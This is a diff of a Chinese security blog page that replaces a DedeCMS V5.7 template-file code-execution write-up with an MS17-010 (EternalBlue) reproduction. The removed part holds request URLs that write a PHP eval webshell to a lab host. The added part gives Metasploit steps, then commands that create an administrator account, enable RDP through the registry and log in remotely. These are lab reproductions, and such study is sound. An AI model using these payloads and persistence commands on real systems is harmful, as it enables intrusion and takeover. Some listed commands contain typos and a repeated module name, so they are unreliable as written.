@@ -4,14 +4,8 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="dedecms V5.7-UTF-8-SP2 命令执行漏洞复现, dylan&#39;s blog">
-    <meta name="description" content="一、漏洞概述
-
-二、漏洞分析环境搭建这里不再赘述，搭建好后访问网站主页
-dedecms默认的后台是/dede,没有修改直接访问登陆
-根据公开的漏洞知道tpl.php里面251-281行存在代码执行漏洞，打开tpl.php文件
-代码分析
-(1">
+    <meta name="keywords" content="永恒之蓝漏洞(ms17-010)复现, dylan&#39;s blog">
+    <meta name="description" content="0x01 漏洞概述永恒之蓝漏洞（Eternalblue）是方程式组织在其漏洞利用框架中一个针对SMB服务进行攻击的漏洞，该漏洞导致攻击者在目标系统上可以执行任意代码。Eternalblue通过TCP端口445和139来利用SMBv1和NBT">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -19,7 +13,7 @@ dedecms默认的后台是/dede,没有修改直接访问登陆
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>dedecms V5.7-UTF-8-SP2 命令执行漏洞复现 | dylan&#39;s blog</title>
+    <title>永恒之蓝漏洞(ms17-010)复现 | dylan&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -279,13 +273,13 @@ dedecms默认的后台是/dede,没有修改直接访问登陆
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/16.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/17.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        dedecms V5.7-UTF-8-SP2 命令执行漏洞复现
+                        永恒之蓝漏洞(ms17-010)复现
                     </div>
                 </div>
             </div>
@@ -404,8 +398,12 @@ dedecms默认的后台是/dede,没有修改直接访问登陆
                                 <span class="chip bg-color">复现</span>
                             </a>
                         
-                            <a href="/tags/dedecms/" target="_blank">
-                                <span class="chip bg-color">dedecms</span>
+                            <a href="/tags/永恒之蓝漏洞/" target="_blank">
+                                <span class="chip bg-color">永恒之蓝漏洞</span>
+                            </a>
+                        
+                            <a href="/tags/ms17-010/" target="_blank">
+                                <span class="chip bg-color">ms17-010</span>
                             </a>
                         
                     </div>
@@ -428,21 +426,21 @@ dedecms默认的后台是/dede,没有修改直接访问登陆
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-07-23
+                    2019-08-07
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        790
+                        383
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        3 分
+                        1 分
                     </div>
                     
                 
@@ -458,27 +456,37 @@ dedecms默认的后台是/dede,没有修改直接访问登陆
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="一、漏洞概述"><a href="#一、漏洞概述" class="headerlink" title="一、漏洞概述"></a>一、漏洞概述</h1><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724101304.png" alt></p>
+                <h1 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h1><p>永恒之蓝漏洞（Eternalblue）是方程式组织在其漏洞利用框架中一个针对SMB服务进行攻击的漏洞，该漏洞导致攻击者在目标系统上可以执行任意代码。Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，无需用户进行任何操作，就可以中招。</p>
 <hr>
-<h1 id="二、漏洞分析"><a href="#二、漏洞分析" class="headerlink" title="二、漏洞分析"></a>二、漏洞分析</h1><p>环境搭建这里不再赘述，搭建好后访问网站主页<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724102343.png" alt></p>
-<p>dedecms默认的后台是/dede,没有修改直接访问登陆<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724102453.png" alt></p>
-<p>根据公开的漏洞知道tpl.php里面251-281行存在代码执行漏洞，打开tpl.php文件<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724102828.png" alt></p>
-<p><strong>代码分析</strong></p>
-<pre><code>(1)此处定义了一个savetagfile的函数，首先做一个判断，参数“action”是否等于savetagfile，如果等于，就进行下一步
-(2)csrf_chack(),这里有一个csrf检验的函数，我们需要加上token来绕过，token是登陆的令牌，当我们向服务器发送登录请求时，在客户端会生成一个用于验证的令牌。
-(3)正则表达式匹配，详情参见https://www.runoob.com/regexp/regexp-rule.html*
-   [a-z0-9_-]{1,}的意思是，匹配所有包含一个以上的字母数字下划线和横杠，后面的\.意思是匹配小数点
-   所以最终那个判断条件的意思是如果参数filename不符合上述的匹配条件，那么就不允许修改操作的进行，所以文件名必须要.lib.php结尾。
-(4)preg_replace的意思是执行一个正则表达式的搜索和替换，我们可以通过例子来分析一下,发现得到的$tagname的值为moonsec
-(5)stripslashes()的作用是引用用一个引用字符串，此处没有多大的作用
-(6)最后是把$content里的内容写入到相对用的路径里，问题就出在了这里，这一部分代码除了对写入的文件名字做了简单的过滤，除了有一个csrf防护之外，其他并没有什么安全措施，     
-   导致我们可以任意写入代码，如果我们直接写入一句话木马，那么就可以直接连上去拿webshell了</code></pre><p>根据上面的代码知道要上传的参数有：action,token,filename,content.现在只剩下获取token了，要怎么才能获取到token呢？我们再去tpl.php里看一下，发现action的参数有很多，比如del，upoladok，edit，upload等等，但只有传入upload的时候页面才会回显正常，而其他的都会显示token异常，所以只能通过action=upload来获取token。</p>
+<h1 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h1><p>目前已知受影响的Windows 版本包括但不限于：<br>WindowsNT<br>Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8<br>Windows Server 2008、Windows Server 2008 R2、Windows Server 2012 SP0</p>
 <hr>
-<h1 id="三-、漏洞复现"><a href="#三-、漏洞复现" class="headerlink" title="三 、漏洞复现"></a>三 、漏洞复现</h1><p>获取token，访问 域名 + /dede/tpl.php?action=upload<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724104103.png" alt><br>然后查看网页源代码，找到token<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724104145.png" alt><br>构造payload如下<br><a href="http://192.168.159.130/dede5.7/dede/tpl.php?filename=(文件名随意).lib.php&amp;action=savetagfile&amp;content=%3C?php%20phpinfo();?%3E&amp;token=f1ccc319d5c897a3a362335792a21e05(替换你复制的token)" target="_blank" rel="noopener">http://192.168.159.130/dede5.7/dede/tpl.php?filename=(文件名随意).lib.php&amp;action=savetagfile&amp;content=%3C?php%20phpinfo();?%3E&amp;token=f1ccc319d5c897a3a362335792a21e05(替换你复制的token)</a><br>访问了成功写入<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724104653.png" alt><br>访问写入的文件，域名+include/taglib/（你上传的文件名）.lib.php<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724104810.png" alt><br>也可以构造一句话木马payload，<a href="http://192.168.159.130/dede5.7/dede/tpl.php?filename=caidao.lib.php&amp;action=savetagfile&amp;content=%3C?php%20@eval($_POST[%27dylan%27])?%3E&amp;token=2d7ef87e9828edaad2d7b6bbe37f1929" target="_blank" rel="noopener">http://192.168.159.130/dede5.7/dede/tpl.php?filename=caidao.lib.php&amp;action=savetagfile&amp;content=%3C?php%20@eval($_POST[%27dylan%27])?%3E&amp;token=2d7ef87e9828edaad2d7b6bbe37f1929</a><br>直接用菜刀连接<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724105245.png" alt></p>
+<h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h1><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>攻击机：kali 2.0<br>靶机：Windows 7 X64 （192.168.159.133）</p>
+<h2 id="发现主机"><a href="#发现主机" class="headerlink" title="发现主机"></a>发现主机</h2><h3 id="使用nmap扫描"><a href="#使用nmap扫描" class="headerlink" title="使用nmap扫描"></a>使用nmap扫描</h3><p><code>nmap -r 192.168.159.0/24C</code></p>
+<p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190807171738.png" alt></p>
+<h3 id="使用msf扫描模块"><a href="#使用msf扫描模块" class="headerlink" title="使用msf扫描模块"></a>使用msf扫描模块</h3><p> kali 执行 <code>msfconsole</code> 进入MSF框架</p>
+<p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190807172414.png" alt></p>
+<p>搜索ms17_010<br><code>search ms17_010</code><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190807172807.png" alt></p>
+<p>使用ms17-010扫描模块，对靶机Win7进行扫描<br>使用模块<br><code>use auxiliary/scanner/smb/smb_ms17_010</code></p>
+<p>设置目标ip<br><code>set RHOSTS 192.168.159.133</code></p>
+<p>执行<br><code>run</code><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190807173247.png" alt></p>
+<h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h2><p>使用模块<br><code>use auxiliary/scanner/smb/smb_ms17_010</code></p>
+<p>设置目标ip<br><code>set RHOSTS 192.168.159.133</code></p>
+<p>查看选项<br><code>shwo options</code></p>
+<p>执行<br><code>exploit</code></p>
+<p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190807173713.png" alt></p>
+<p>成功拿到shell<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190807174031.png" alt></p>
+<h2 id="控制提权"><a href="#控制提权" class="headerlink" title="控制提权"></a>控制提权</h2><p>windows shell 下执行：<br>新建用户<br><code>net user dylan 123456 /add</code></p>
+<p>添加管理组<br><code>net localgroup administrators dylan /add</code></p>
+<p>开启远程桌面<br><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</code></p>
+<p>kali 登陆远程桌面：<br><code>rdesktop 192.168.159.133:3389</code></p>
+<p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190807175105.png" alt></p>
 <hr>
-<h1 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h1><p>虽然这个漏洞很鸡肋，需要拿到管理员账号密码才行，但还是有必要复现了解，反复练习才能有进步。</p>
+<h1 id="0x04-漏洞修复"><a href="#0x04-漏洞修复" class="headerlink" title="0x04 漏洞修复"></a>0x04 漏洞修复</h1><ul>
+<li>在线更新：开启Windows Update更新。</li>
+<li>打补丁：<a href="https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2017/ms17-010" target="_blank" rel="noopener">点击下载</a></li>
+</ul>
 <hr>
-<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2018-01221" target="_blank" rel="noopener">国家信息安全漏洞共享平台</a><br><a href="https://blog.csdn.net/qq_41954384/article/details/93057317" target="_blank" rel="noopener">dedeCMS后台代码执行漏洞-CNVD-2018-01221</a></p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.freebuf.com/column/193681.html" target="_blank" rel="noopener">永恒之蓝漏洞复现(ms17-010)</a><br><a href="https://blog.51cto.com/chenxinjie/2092754?from=timeline" target="_blank" rel="noopener">MS17-010 基于”永恒之蓝”实现Windows Getshell</a></p>
 
             </div>
             <hr/>
@@ -637,9 +645,9 @@ dedecms默认的后台是/dede,没有修改直接访问登陆
             <br/>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                   property="dct:title" rel="dct:type">
-                    《dedecms V5.7-UTF-8-SP2 命令执行漏洞复现》
+                    《永恒之蓝漏洞(ms17-010)复现》
                 </span> 由
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/07/23/dedecms-v5.7-utf-8-sp2-ming-ling-zhi-xing-lou-dong-fu-xian/" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/08/07/yong-heng-zhi-lan-lou-dong-ms17-010-fu-xian/" property="cc:attributionName"
                rel="cc:attributionURL">
                 dylan
             </a> 采用
@@ -938,33 +946,30 @@ dedecms默认的后台是/dede,没有修改直接访问登陆
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2019/07/24/zzzphp-v1.6.1-yuan-cheng-dai-ma-zhi-xing-lou-dong-fen-xi-fu-xian/">
+                <a href="/2019/08/07/yong-heng-zhi-lan-lou-dong-ms17-010-fu-xian/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="zzzphp V1.6.1 远程代码执行漏洞复现">
+                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="永恒之蓝漏洞(ms17-010)复现">
                         
-                        <span class="card-title">zzzphp V1.6.1 远程代码执行漏洞复现</span>
+                        <span class="card-title">永恒之蓝漏洞(ms17-010)复现</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            一、漏洞概述远程代码执行漏洞存在的主要原因是页面对模块的php代码过滤不严谨，导致在后台可以写入php代码从而造成代码执行。
-
-二、漏洞复现本地搭建zzzphp V1.6.1环境
-在后台模块管理中的电脑模块找到cn2016
-然后在cn201
+                            0x01 漏洞概述永恒之蓝漏洞（Eternalblue）是方程式组织在其漏洞利用框架中一个针对SMB服务进行攻击的漏洞，该漏洞导致攻击者在目标系统上可以执行任意代码。Eternalblue通过TCP端口445和139来利用SMBv1和NBT
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-07-24
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-08-07
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
@@ -977,6 +982,7 @@ dedecms默认的后台是/dede,没有修改直接访问登陆
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -988,8 +994,12 @@ dedecms默认的后台是/dede,没有修改直接访问登陆
                         <span class="chip bg-color">复现</span>
                     </a>
                     
-                    <a href="/tags/zzzphp/" target="_blank">
-                        <span class="chip bg-color">zzzphp</span>
+                    <a href="/tags/永恒之蓝漏洞/" target="_blank">
+                        <span class="chip bg-color">永恒之蓝漏洞</span>
+                    </a>
+                    
+                    <a href="/tags/ms17-010/" target="_blank">
+                        <span class="chip bg-color">ms17-010</span>
                     </a>
                     
                 </div>
@@ -1003,24 +1013,25 @@ dedecms默认的后台是/dede,没有修改直接访问登陆
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/07/22/discuz-ml-v3.x-dai-ma-zhu-ru-lou-dong-fu-xian/">
+                <a href="/2019/08/06/weblogic-wls-zu-jian-lou-dong-fu-xian/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="Discuz ML! V3.X 代码注入漏洞复现">
+                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="WebLogic WLS组件漏洞复现">
                         
-                        <span class="card-title">Discuz ML! V3.X 代码注入漏洞复现</span>
+                        <span class="card-title">WebLogic WLS组件漏洞复现</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            一、漏洞概述2019年7月11日， Discuz！ML被发现存在一处远程代码执行漏洞，攻击者通过在请求流量的cookie字段中的language参数处插入构造的payload，进行远程代码执行利用，该漏洞利用方式简单，危害性较大。本次漏洞是
+                            0x01 漏洞概述漏洞编号：CVE-2017-10271
+漏洞描述：Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-07-22
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-08-06
                             </span>
                         <span class="publish-author">
                             
@@ -1045,8 +1056,12 @@ dedecms默认的后台是/dede,没有修改直接访问登陆
                         <span class="chip bg-color">复现</span>
                     </a>
                     
-                    <a href="/tags/Discuz/" target="_blank">
-                        <span class="chip bg-color">Discuz</span>
+                    <a href="/tags/WebLogic-WLS/" target="_blank">
+                        <span class="chip bg-color">WebLogic WLS</span>
+                    </a>
+                    
+                    <a href="/tags/中间件/" target="_blank">
+                        <span class="chip bg-color">中间件</span>
                     </a>
                     
                 </div>
